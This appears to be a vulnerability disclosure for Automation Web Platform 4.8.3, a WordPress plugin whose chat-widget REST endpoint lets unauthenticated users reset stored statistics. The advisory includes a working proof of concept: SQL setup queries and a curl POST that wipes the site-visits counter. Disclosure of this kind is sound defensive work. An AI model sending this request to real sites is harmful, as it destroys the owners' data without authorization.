#  Automation Web Platform 4.8.3 Unauthenticated Statistics Reset

## Summary

Automation Web Platform version 4.8.3 contains a missing authorization vulnerability that allows unauthenticated users to reset chat widget statistics through a publicly accessible REST API endpoint.

An attacker can send a crafted HTTP request to the affected endpoint and reset analytics data without authentication, resulting in unauthorized modification of plugin statistics.

## Vulnerability Details

The plugin registers a REST API endpoint:

```
/wp-json/wawp/v1/chat-widget/clear-stats
```

The endpoint is accessible without authentication due to improper authorization checks. As a result, unauthenticated users can invoke functionality intended for privileged users and reset stored statistics.

During testing, the `wawp_site_visits` option was modified from a non-zero value to `0` by an unauthenticated request, confirming successful exploitation and demonstrating unauthorized modification of application data.

### Affected Version

* Automation Web Platform 4.8.3

### Vulnerability Type

* Missing Authorization
* Broken Access Control
* CWE-862: Missing Authorization

## Proof of Concept

Set a non-zero statistics value:

```sql
UPDATE wp_options
SET option_value = '999'
WHERE option_name = 'wawp_site_visits';
```

Verify the value:

```sql
SELECT option_name, option_value
FROM wp_options
WHERE option_name = 'wawp_site_visits';
```

Expected result:

```
wawp_site_visits = 999
```

Send an unauthenticated request:

```bash
curl -i -X POST \
"http://127.0.0.1/wordpress/wp-json/wawp/v1/chat-widget/clear-stats"
```

Response:

```json
{
  "success": true,
  "message": "Stats cleared."
}
```

Verify the value again:

```sql
SELECT option_name, option_value
FROM wp_options
WHERE option_name = 'wawp_site_visits';
```

Result:

```
wawp_site_visits = 0
```

This demonstrates that an unauthenticated attacker can reset stored statistics.

## Impact

An unauthenticated remote attacker can reset plugin analytics and statistics data without authorization.

Potential impacts include:

* Loss of analytics integrity
* Manipulation of reporting data
* Destruction of historical statistics
* Reduced trustworthiness of administrative metrics

## CVSS v3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
```

### Base Score

**5.3 (Medium)**

## Credits

Discovered by Vaibhav Narkhede.
